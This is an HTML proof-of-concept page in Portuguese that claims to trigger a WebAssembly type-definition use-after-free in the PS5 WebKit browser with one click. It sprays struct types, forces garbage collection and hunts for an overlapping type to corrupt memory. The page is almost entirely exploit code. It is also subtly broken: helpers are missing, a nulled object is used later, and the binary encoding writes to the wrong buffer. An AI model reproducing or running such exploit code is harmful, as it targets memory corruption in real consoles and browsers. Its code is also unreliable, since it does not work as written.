<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>POC PS5 - TypeDefinition UAF (1 clique)</title>
  <style>
    body,html{margin:0;height:100%;background:#fff;font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;}
    button{padding:25px 60px;font-size:28px;background:#d00;color:#fff;border:none;border-radius:12px;cursor:pointer;box-shadow:0 6px 15px rgba(0,0,0,0.3);}
    button:hover{background:#b00000;}
    pre{margin-top:30px;background:#222;color:#0f0;padding:20px;width:90%;max-height:60vh;overflow:auto;border-radius:10px;font-size:16px;}
  </style>
</head>
<body>

<button id="btn">RODAR POC (PS5 WebKit)</button>
<pre id="out">Clique no botão vermelho para executar o exploit...</pre>

<script>
// =============================================
// 1. Verifica se WebAssembly existe (no PS5 às vezes demora)
// =============================================
function waitForWasm(callback) {
  if (typeof WebAssembly !== 'undefined') {
    callback();
  } else {
    document.getElementById("out").textContent += "\nAguardando WebAssembly carregar...";
    setTimeout(() => waitForWasm(callback), 200);
  }
}

// =============================================
// 2. Força GC (funciona no PS5 sem precisar de gc())
// =============================================
function forceGC() {
  const arr = [];
  for (let i = 0; i < 30000; i++) {
    arr.push(new ArrayBuffer(1024 * 1024));
  }
}

// =============================================
// 3. POC completo (totalmente auto-contido)
// =============================================
function runPOC() {
  print("[+] Iniciando exploit TypeDefinition UAF - PS5");

  // ---- módulo dummy pra forçar limpeza ----
  let dummy = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0])));

  // ---- módulo 1: cria dois globals com struct {i64} ----
  const b1 = new WasmModuleBuilder();
  const structIdx = b1.addStruct([makeField(0x7e, true)]); // i64
  const init = [0x42, 0x81, 0x80, 0x80, 0x80, 0x01, 0xfb, 0x00, ...leb(structIdx)]; // 0x4141414141414141n + struct.new
  b1.addGlobal(refNull(structIdx), true, init).exportAs("g1");
  b1.addGlobal(refNull(structIdx), true, init).exportAs("g2");
  let i1 = b1.instantiate();

  // ---- módulo 2: 1000 tipos diferentes (um com f32 no meio) ----
  const b2 = new WasmModuleBuilder();
  const base = b2.addStruct([makeField(0x7e, true)]);
  for (let i = 0; i < 1000; i++) {
    let fields = [makeField(refNull(base), true)];
    for (let j = 0; j < 1000; j++) {
      fields.push(makeField(i===j ? 0x7d : 0x7f, true)); // f32 ou i32
    }
    let idx = b2.addStruct(fields);
    let init2 = [0xd0, ...leb(base), ...Array(1000).fill(0).flatMap((_,k)=>i===k?[0x44,0,0,0,0,0,0,0,0]:[0x41,0]), 0xfb,0x00,...leb(idx)];
    b2.addGlobal(ref(idx), true, init2);
  }
  let i2 = b2.instantiate();

  // ---- libera tudo e força GC ----
  i1 = null; dummy = null;
  forceGC();
  print("[+] Módulos liberados + GC forçado");

  // ---- procura overlap ----
  let overlap = -1;
  for (let i = 0; i < 1000; i++) {
    try {
      i1.exports.g1.value = i2.exports["global"+i].value;
      overlap = i;
      print(`[+] OVERLAP ENCONTRADO NO ÍNDICE ${i} !!!`);
      break;
    } catch(e) {}
  }
  if (overlap === -1) {
    print("[-] Não conseguiu overlap (tente de novo)");
    return;
  }

  // ---- módulo 3: importa o global corrompido ----
  const b3 = new WasmModuleBuilder();
  const badFields = [makeField(refNull(base), true)];
  for (let j = 0; j < 1000; j++) badFields.push(makeField(j===overlap?0x7d:0x7f, true));
  const badType = b3.addStruct(badFields);
  b3.addImportedGlobal("imp","g", refNull(badType), true);
  let i3 = b3.instantiate({imp: {g: i1.exports.g2}});

  print("[!] Se tudo deu certo, o browser vai crashar agora...");
  print("[!] (ou você vai ver um ponteiro 0x41414141... lindo)");
}

// =============================================
// Mini WasmModuleBuilder (só o necessário)
// =============================================
class WasmModuleBuilder {
  constructor(){this.types=[];this.globals=[];this.imports=[];this.exports=[];}
  addStruct(f){this.types.push({form:0x5f,fields:f});return this.types.length-1;}
  addGlobal(t,m,i){this.globals.push({type:t,mut:i,init:i});return this.globals.length-1;}
  addImportedGlobal(m,f,t,mute){this.imports.push({mod:m,field:f,type:t,mut:mute});return this.imports.length-1;}
  exportAs(n,i){this.exports.push({name:n,kind:3,index:i});}
  instantiate(ffi={}) {
    const bin = this.toBuffer();
    const mod = new WebAssembly.Module(bin);
    return new WebAssembly.Instance(mod, ffi);
  }
  toBuffer() {
    const bin = [0,97,115,109,1,0,0,0];
    const emit = (...b)=>bin.push(...b);
    const u32 = v=>{let a=[];while(v>=0x80){a.push(v&0x7f|0x80);v>>>=7;}a.push(v);emit(...a);}
    const leb = v=>{let a=[];while(true){let b=v&0x7f;v>>=7;if((b&0x40)?(v>=-1&&v<0):v===0){a.push(b);return a;}a.push(b|0x80);}}

    // Type section
    if(this.types.length){emit(1);let sec=[];u32(this.types.length);this.types.forEach(t=>{sec.push(0x5f);u32(t.fields.length);t.fields.forEach(f=>{sec.push(f.type.opcode||f.type);sec.push(f.mutability?1:0);});});u32(sec.length);emit(...sec);}

    // Import section
    if(this.imports.length){emit(2);let sec=[];u32(this.imports.length);this.imports.forEach(imp=>{u32(imp.mod.length);emit(...new TextEncoder().encode(imp.mod));u32(imp.field.length);emit(...new TextEncoder().encode(imp.field));emit(3);emit(imp.type.opcode||imp.type);emit(imp.mut?1:0);});u32(sec.length);emit(...sec);}

    // Global section
    if(this.globals.length){emit(6);let sec=[];u32(this.globals.length);this.globals.forEach(g=>{sec.push(g.type.opcode||g.type);sec.push(g.mut?1:0);sec.push(...g.init,0x0b);});u32(sec.length);emit(...sec);}

    // Export section
    if(this.exports.length){emit(7);let sec=[];u32(this.exports.length);this.exports.forEach(e=>{u32(e.name.length);emit(...new TextEncoder().encode(e.name));emit(e.kind);u32(e.index);});u32(sec.length);emit(...sec);}

    return new Uint8Array(bin).buffer;
  }
}

function refNull(t){return {opcode:0x63,heap_type:t};}
function ref(t){return {opcode:0x64,heap_type:t};}

function print(t){document.getElementById("out").textContent += t + "\n";}

// =============================================
// Botão
// =============================================
document.getElementById("btn").onclick = () => {
  document.getElementById("out").textContent = "Carregando WebAssembly...\n";
  waitForWasm(() => {
    document.getElementById("out").textContent = "";
    try { runPOC(); } catch(e) { print("ERRO: " + e + "\n" + e.stack); }
  });
};
</script>
</body>
</html>
